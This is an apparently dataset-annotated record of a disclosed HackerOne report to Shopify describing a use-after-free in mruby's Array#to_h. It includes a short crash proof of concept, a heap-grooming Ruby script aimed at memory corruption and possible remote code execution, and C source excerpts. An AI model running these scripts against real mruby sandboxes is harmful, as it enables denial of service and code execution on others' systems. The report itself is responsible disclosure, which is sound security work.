{
  "reported_to": "shopify-scripts",
  "reported_by": "isra17 ",
  "title": "Use after free vulnerability in mruby Array#to_h causing DOS possible RCE",
  "content": "\nThis bug was found with jmlb337.\nVulnerability\nThe function to_h will call the C function mrb_ary_to_h. This will iterate through the elements of the array. If an element is not of type Array it will call attempt to call to_ary method of that object. If to_ary does not return an array, the function will raise a ruby exception with the class name in the exception message.\nHowever, the code does not properly check that the array length was not modified during the call of to_ary. The vulnerability is triggered when the array is shrunk during call to to_ary, letting mrb_ary_to_h read an out of bound object to get an element classname. A crash or or denial of service can be triggered by neutering the array in the to_ary call. A mrb_obj_iv_set call done on the controlled class pointer can be used to have a memory write leading to RCE.\nReproduction Step\nDefine a new class that will define the method to_ary.\nin the to_ary clear a global array that will be later define and return a non array object.\nCreate the global array containing an instance of the defined class.\nCall to_h on that array.\nPoC DOS\nCode 72 Bytes\n1class A\n2  def to_ary\n3    $a.clear\n4    nil\n5  end\n6end\n7$a = [A.new]\n8$a.to_h\nThis POC will cause a null memory access and terminate the mruby process.\nExplaination\nThe bug is triggered due to call back to to_ary in array.c:130:\nCode 51 Bytes\n1 v = mrb_check_array_type(mrb, RARRAY_PTR(ary)[i]);\nThe function mrb_check_array_type check if the element at RARRAY_PTR(ary)[i]. in the case of the POC it will be of type A. It will then continue to call the to_ary method of the A class to convert the value into an array.\nCode 497 Bytes\n1MRB_API mrb_value\n2mrb_check_array_type(mrb_state *mrb, mrb_value ary)\n3{\n4  return mrb_check_convert_type(mrb, ary, MRB_TT_ARRAY, \"Array\", \"to_ary\");\n5}\n6\n7MRB_API mrb_value\n8mrb_check_convert_type(mrb_state *mrb, mrb_value val, enum mrb_vtype type, const char *tname, const char *method)\n9{\n10  mrb_value v;\n11\n12  if (mrb_type(val) == type && type != MRB_TT_DATA) return val;\n13  v = convert_type(mrb, val, tname, method, FALSE);\n14  if (mrb_nil_p(v) || mrb_type(v) != type) return mrb_nil_value();\n15  return v;\n16}\nBy calling the Array#clear method on the global array, the pointer to the array data (ptr) will be set to null.\nCode 120 Bytes\n1MRB_API mrb_value\n2mrb_ary_clear(mrb_state *mrb, mrb_value self)\n3{\n4...\n5  a->len = 0;\n6  a->aux.capa = 0;\n7  a->ptr = 0;\n8...\nSince to_ary will not return an array, the C code will attempt to raise an exception with the class name in the exception message.\nCode 180 Bytes\n1 if (mrb_nil_p(v)) {\n2      mrb_raisef(mrb, E_TYPE_ERROR, \"wrong element type %S at %S (expected array)\",\n3        mrb_str_new_cstr(mrb,  mrb_obj_classname(mrb, RARRAY_PTR(ary)[i])),\nwhen it calls RARRAY_PTR(ary)[i] it will attempt to reference 0[i] and crash the process.\nExploitability\nThe vulnerability is exploitable as long as the attacker can run arbitrary ruby code in the mruby interpreter. It should cover mruby-engine case as used by Shopify.\nImpact\nThis vulnerability can cause a Denial Of service on the mruby process very reliably. It could also lead to farther memory corruption and potentially lead to Remote Code Execution.\nWe are convinced we can push this bug further to lead to memory corruption and RCE. I spoke with Fran\u00e7ois Chagnon and we preferred to report the bugs as soon as possible while working on a complete proof of concept afterward so it can get patched earlier. Therefor we would like a week or two to get time to work on this and be able to claim the higher tier bounty. The proof of concept would also used the other reported bug #181319 to get a memory disclosure.\nPossible Remote Code Execution POC #2\nCode 448 Bytes\n1$size = 32\n2$bb = []\n3for i in 0..256\n4 $bb.push(\"b\"*$size)\n5end\n6\n7class A\n8 def to_ary\n9   $bb.clear\n10   $a.clear\n11   $a.push(\"b\"*256)\n12   #first byte is 0 as long as the lsb != 1 its fine\n13   $a.push(\"\\x00bcdefg\\x70hijklmnopqurtuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY\"*3 + (\"a\"*200))\n14   $a.push(\"y\"*256)\n15   $a.push(\"e\"*256)\n16\n17   return \"a\"\n18 end\n19end\n20\n21$a = [[1,\"a\"],[1,\"a\"],[1,\"a\"],[1,\"a\"],[1,\"a\"],[1,\"a\"],A.new]\n22\n23for i in 0..256\n24 $bb.push(\"z\"*$size)\n25end\n26\n27@a = $a.to_h\nExploitation\nIn the second POC, and attacker creates an array of 7 elements where the last element has an object with the vulnerable to_ary method. 7 elements is important because when the bug is triggered the index of the array will be out of bounds by 3 pointer size. That is where our data will be.\nafter clearing the global array push some elements back into the array. No more than 4 since that will increase the capacity of the array to 8 and our index will not be out of bounds.\nby pushing the large strings the data of the strings will be placed after the array data. When the call is made to mrb_obj_classname(mrb, RARRAY_PTR(ary)[i]),\nuser controlled data will be returned.\nAn attacker could then craft an mrb_value object using the strings and cause farther memory corruption.\nThere exists code paths that could allow an attacker to right data to a pointer crafted by the attacker.\nProposed Fix\nSee patch in attachment.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1481936700,
  "report_url": "https://hackerone.com/reports/181321",
  "is_multi_component": false,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Define a new class A with a to_ary method that clears a global array and returns nil"
    ],
    [
      2,
      "Create a global array $a containing an instance of class A"
    ],
    [
      3,
      "Call to_h on the global array $a"
    ]
  ],
  "vuln_description": "The vulnerability is a use-after-free in mruby's Array#to_h method where improper bounds checking after a callback to to_ary can lead to out-of-bounds memory access. When an array is modified during the to_ary callback, the subsequent attempt to access array elements can read invalid memory, potentially leading to denial of service or remote code execution.",
  "reason": "This vulnerability requires deep understanding of mruby's internal array handling, callback mechanisms during type conversion, and memory management. The attacker must carefully craft object interactions during a sensitive type conversion operation, and understand how array modifications during callbacks affect subsequent memory accesses. The exploitation path involves non-obvious interactions between array operations, type conversions, and exception handling.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "181319",
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves manipulating array operations within the mruby interpreter, which is not related to authentication or authorization boundaries in a web application context. The described methodology focuses on HTTP requests and session/resource manipulation, not interpreter-level memory corruption vulnerabilities.",
    "is_detectable": false
  }
}